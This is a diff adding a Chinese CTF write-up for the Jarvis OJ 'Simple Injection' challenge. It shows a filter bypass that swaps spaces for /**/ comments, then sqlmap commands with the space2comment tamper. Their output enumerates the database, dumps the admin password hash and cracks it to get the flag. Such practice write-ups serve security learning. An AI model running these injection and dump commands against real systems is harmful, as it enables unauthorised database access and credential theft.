@@ -415,5 +415,120 @@ p神的blog :
 
 另外，只有`salt`在前，`value`在后，才可使用 Hash长度扩展攻击。
 
+### Simple Injection
 
+Description：
+
+>很简单的注入，大家试试？
+>
+>`link：http://web.jarvisoj.com:32787/`
+>
+>source：ISCC2016
+
+打开是一个登录框，输入 admin 进行 Fuzz，显示密码错误
+
+接着输入 admin' ，提示用户名错误。
+
+经多次测试，发现对空格进行了过滤，并且可以用 `/**/` 进行绕过。
+
+对关键字貌似并没有过滤，至少不影响本次做题，因此我们可以直接用 sqlmap 跑
+
+因为是 Post ，我们用 Burpsuite 抓包后，存为 txt 文件，然后使用 -r 进行读取
+
+并且我们知道空格用 `/**/` 绕过，并且注入点在 `username`
+
+```shell
+# sqlmap -r 1.txt --tamper=space2comment -p username 
+```
+
+这题是盲注，Time-based 和 Bool-Based 都可以，取决于写脚本的方式
+
+回显：
+
+![](/root/Writeups/JarvisOJ/Web WriteUps for Jarvis OJ.assets/simple_inj.jpg)
+
+接下来读取数据库：
+
+```powershell
+# sqlmap -r 1.txt --tamper=space2comment -p username --dbs 
+
+[17:25:52] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.6.21, Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+[17:25:52] [INFO] fetching database names
+[17:25:52] [INFO] fetching number of databases
+[17:25:53] [INFO] resumed: 3
+[17:25:53] [INFO] resumed: information_schema
+[17:25:53] [INFO] resumed: injection
+[17:25:53] [INFO] resumed: test
+available databases [3]:
+[*] information_schema
+[*] injection
+[*] test
+```
+
+我们猜测 `injection` 表，查询 `tables` 
+
+```shell
+# sqlmap -r 1.txt --tamper=space2comment -p username -D injection --tables      
+
+web application technology: PHP 5.6.21, Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+[17:31:53] [INFO] fetching tables for database: 'injection'
+[17:31:53] [INFO] fetching number of tables for database 'injection'
+[17:31:53] [INFO] resumed: 1
+[17:31:53] [INFO] resumed: admin
+Database: injection
+[1 table]
++-------+
+| admin |
++-------+
+
+```
+
+查询 `columns`
+
+```shell
+# sqlmap -r 1.txt --tamper=space2comment -p username -D injection -T admin --columns
+
+web application technology: PHP 5.6.21, Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.12
+[17:33:26] [INFO] fetching columns for table 'admin' in database 'injection'
+[17:33:26] [INFO] resumed: 3
+[17:33:26] [INFO] resumed: id
+[17:33:26] [INFO] resumed: int(11)
+[17:33:26] [INFO] resumed: username
+[17:33:26] [INFO] resumed: varchar(255)
+[17:33:26] [INFO] resumed: password
+[17:33:26] [INFO] resumed: varchar(255)
+Database: injection
+Table: admin
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| password | varchar(255) |
+| username | varchar(255) |
++----------+--------------+
+```
+
+看到有三个字段 `id`, `username` , `password` , 直接 dump 出来
+
+```shell
+# sqlmap -r 1.txt --tamper=space2comment -p username -D injection -T admin -C "id,username,password" --dump
+
+Database: injection
+Table: admin
+[1 entry]
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+| 1  | admin    | 334cfb59c9d74849801d5acdcfdaadc3 |
++----+----------+----------------------------------+
+```
+
+我们得到 admin 的密码，看样子是一个 md5 的值，我们上网搜一下，得到结果 `eTAloCrEP`
+
+登录 admin 和密码直接登录，得到 flag
 
